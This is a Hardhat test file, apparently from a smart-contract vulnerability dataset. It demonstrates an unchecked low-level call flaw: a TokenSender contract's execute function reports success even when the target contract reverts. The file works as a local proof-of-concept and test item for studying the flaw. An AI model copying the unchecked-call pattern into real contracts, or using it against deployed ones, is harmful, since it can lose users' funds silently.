const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');

describe("attack unchecked_low_level_calls/0xec329ffc97d75fe03428ae155fc7793431487f63.sol", function () {

  let onwer;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const TokenEBU = await ethers.getContractFactory("contracts/unchecked_low_level_calls/TokenEBU.sol:TokenEBU");
    const token = await TokenEBU.deploy(1, "EBU", "EBU");

    const TokenSender = await ethers.getContractFactory("contracts/dataset/unchecked_low_level_calls/0xec329ffc97d75fe03428ae155fc7793431487f63.sol:TokenSender");
    const contract = await TokenSender.connect(owner).deploy(token.target);


    const RevertContract = await ethers.getContractFactory("contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract");
    const revertContract = await RevertContract.deploy();

    return {token, contract, revertContract}
  };

  it("exploit unchecked low level call vulnerability", async function () {
    const {token, contract, revertContract} = await loadFixture(deployContracts);
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(0);
    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      })
    ).to.be.revertedWith("I always revert!");

    await expect(contract.connect(owner).execute(revertContract.target, 0, "0x")).to.not.be.reverted;

    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(0);

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(0);

  });
});
